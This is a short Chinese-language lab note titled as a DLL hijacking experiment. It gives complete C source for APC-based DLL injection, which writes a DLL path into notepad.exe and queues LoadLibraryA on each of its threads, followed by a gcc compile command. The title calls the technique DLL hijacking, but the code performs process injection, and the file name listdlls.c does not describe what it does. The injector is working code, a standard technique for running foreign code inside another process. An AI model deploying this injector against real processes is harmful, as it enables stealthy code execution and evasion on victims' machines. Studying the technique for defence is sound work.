# DLL 劫持实验

listdlls.c

```c
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// 获取目标进程ID的函数
DWORD FindProcessId(const char *processname) {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    DWORD result = 0;

    // 创建进程快照
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        printf("创建进程快照失败。\n");
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    // 遍历进程列表，查找目标进程
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            if (strcmp(pe32.szExeFile, processname) == 0) {
                result = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }

    CloseHandle(hProcessSnap);
    return result;
}

// 主函数
int main() {
    const char *dllPath = "D://hello.dll";
    const char *targetProcess = "notepad.exe";
    DWORD pid = FindProcessId(targetProcess);

    if (pid == 0) {
        printf("找不到目标进程：%s\n", targetProcess);
        return 1;
    } else {
        printf("找到 %s 进程，PID = %u\n", targetProcess, pid);
    }

    // 打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("打开目标进程失败。\n");
        return 1;
    }

    // 在目标进程中为DLL路径分配内存
    LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (pDllPath == NULL) {
        printf("在目标进程中分配内存失败。\n");
        CloseHandle(hProcess);
        return 1;
    }

    // 将DLL路径写入目标进程
    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, NULL);

    // 获取LoadLibraryA函数的地址
    HMODULE hKernel32 = GetModuleHandle("Kernel32");
    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");

    // 遍历线程注入APC
    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    if (Thread32First(hThreadSnap, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
                if (hThread) {
                    // 向线程队列中插入APC
                    QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)pDllPath);
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hThreadSnap, &te32));
    }
    CloseHandle(hThreadSnap);

    printf("APC队列已注入所有线程。\n");

    // 清理
    CloseHandle(hProcess);
    printf("注入完成。\n");

    return 0;
}
```

编译

```powershell
gcc -o listdlls listdlls.c -lpsapi
```

